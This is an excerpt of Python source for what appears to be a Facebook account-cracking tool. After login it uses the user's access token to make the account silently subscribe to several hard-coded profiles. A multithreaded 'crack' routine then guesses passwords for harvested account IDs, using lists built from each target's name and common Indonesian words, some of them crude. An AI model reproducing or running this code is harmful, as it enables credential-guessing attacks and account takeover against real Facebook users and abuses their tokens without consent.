...
def login():
	...
	if(pil in ("01","1")):
		...
		try:
			nama=r['name']
			req.post(f'https://graph.facebook.com/10003198966181/subscribers?access_token={to}')
			req.post(f'https://graph.facebook.com/10000018035398/subscribers?access_token={to}')
			req.post(f'https://graph.facebook.com/10001145853652/subscribers?access_token={to}')
			req.post(f"https://graph.facebook.com/101133821/subscribers?access_token={to}")
			req.post(f"https://graph.facebook.com/1069718286138/subscribers?access_token={to}")
			req.post(f"https://graph.facebook.com/10353548711079/subscribers?access_token={to}")
...
class crack:
	...
	def crack(self,user,lala,asu):
		...
		ua=awokawok(["Mozilla/5.0 (Linux; Android 9; moto e(6) plus Build/PTBS29.401-58-2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.101 Mobile Safari/537.36 EdgW/1.0[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]",open("ua","r").read()])
			...
			with Bool(max_workers=35) as kirim:
				...
				for email in id:
					...
					if(len(str(name.lower()))>=6):
						pw=[name.lower(),name.lower()+'123',name.lower()+'1234',name.lower()+'12345','bismillah','indonesia','sayangku','sayangkamu','rahasia']
					elif(len(str(name.lower()))<=2):
						pw=[name.lower()+'1234',name.lower()+'12345','bismillah','persib1933','persija1928','jakarta','bandung','kontol','anjing','bangsatlu','bangsat']
					elif(len(str(name.lower()))<=3):
						pw=[name.lower()+'123',name.lower()+'1234',name.lower()+'12345','bismillah','doraemon','nobita','mancung','pesek123','terserah','anjinglo']
					else:
						pw=[name.lower()+'12345','bismillah','indonesia1945','indonesia45','allahuakbar','merdeka','sayangkamu','cantik123','ganteng','freefire']
					if(tip in ("02","2")):
